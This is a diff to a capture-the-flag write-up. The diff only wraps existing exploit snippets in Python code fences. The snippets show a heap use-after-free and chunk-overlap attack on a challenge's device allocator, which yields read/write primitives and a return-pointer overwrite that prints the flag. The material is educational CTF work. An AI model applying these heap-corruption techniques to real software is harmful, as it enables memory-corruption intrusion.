@@ -16,6 +16,7 @@ Our goal here is to allocate structure with pointers to area that we can control
 
 When we create new device 3 malloc call is invoked, one for device structure (0xb size) and two calls for *key* and *name* fields with variable size. Our strategy is to create two devices (*dev0* and *dev1*) with shortest *key* and *name* fields, then free *dev0* and create new *dev2* with *key* longer than previous, in that case *dev0* freed *key* chunk won't fit new longer *key* and new chunk will be allocated right next to *dev1* *key*. Next using "buggy" *modify* option we encrease size of *dev1* *key* chunk to 0xb (device structure size), as the result this chunk will overlap with *dev2* *key* chunk, which content can modified. Now we free *dev1* and create new *dev3*, as our prediction *dev3* struc will be allocated on crafted overlapped chunk, *name* and *key* pointer will at our control which gives us read and write primitive:
 
+```python
     new_dev(tty,"a","b")             # dev 0
     new_dev(tty,"c","d")             # dev 1
     del_dev(tty,0)                   # free dev 0
@@ -24,9 +25,11 @@ When we create new device 3 malloc call is invoked, one for device structure (0x
     edit_dev(tty,1,"z0\x0b","a")     # encrease dev1 key chunk
     del_dev(tty,1)                   # free dev 1
     new_dev(tty,"g","h")             # dev3 with overlapped chunk
+```
 
 Few things left to get the flag, to make proper jump we need to now dynamic stack frame size for main function, luckly it's just stored at data section by 0x2192 address. Other thing is that we need to replace 0xDEADBEEF to 0xBAADF00D at 0x2000:
 
+```python
     edit_dev(tty,2,"x","\x01\x01\x01"+"\x01\x20") # set ptr to 0x2001
     edit_dev(tty,2,"x","\x01\x01\x01")            # set ptrl to 0x00 via null terminator
     edit_dev(tty,3,"g",struct.pack("I",0xBAADF00D)+"\xa0\x08\x40\x06\x04\x08\x04\x20") #write 0xbaadf00d and serial config to avoid corruption
@@ -43,6 +46,7 @@ Few things left to get the flag, to make proper jump we need to now dynamic stac
 
     edit_dev(tty,2,"x","\x01\x01\x01"+struct.pack("H",sp-0x2))
     print edit_dev(tty,3,"g",struct.pack(">H",0x182)) # set return pointer to 0x182, big endian! - flag print
+```
 
 After everithing is done properly you will be rewarded with next 200 points.
 Full script can be found among files in github repository.
